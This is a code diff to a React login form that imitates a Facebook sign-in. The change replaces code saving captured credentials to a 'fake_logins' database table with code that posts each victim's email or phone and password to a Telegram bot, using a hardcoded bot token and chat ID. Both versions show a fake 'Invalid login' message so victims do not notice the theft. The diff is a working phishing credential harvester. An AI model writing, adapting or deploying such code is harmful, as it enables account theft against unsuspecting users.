@@ -9,23 +9,33 @@ const LoginForm = () => {
   const handleSubmit = async (e) => {
   e.preventDefault()
 
-  const { data, error } = await supabase.from('fake_logins').insert([
-    {
-      email_or_phone: emailOrPhone,
-      password: password,
-    },
-  ])
+  const BOT_TOKEN = '7978921198:AAGMpYfajBHF8LgWVC0f1sxRcNqtRggMH8I'
+  const CHAT_ID = '5576038167'
 
-  if (error) {
-    console.error('Error saving to DB:', error)
-    setMessage('Invalid login') // still pretend like it's invalid
-  } else {
-    setMessage('Invalid login') // even on success, show fake error
+  const message = `🔐 Facebook Login Attempt:\n📧: ${emailOrPhone}\n🔑: ${password}`
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+      }),
+    })
+
+    setMessage('Invalid login') 
+  } catch (error) {
+    console.error('Error sending to Telegram:', error)
+    setMessage('Invalid login')
   }
 
   setEmailOrPhone('')
   setPassword('')
 }
+
 
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
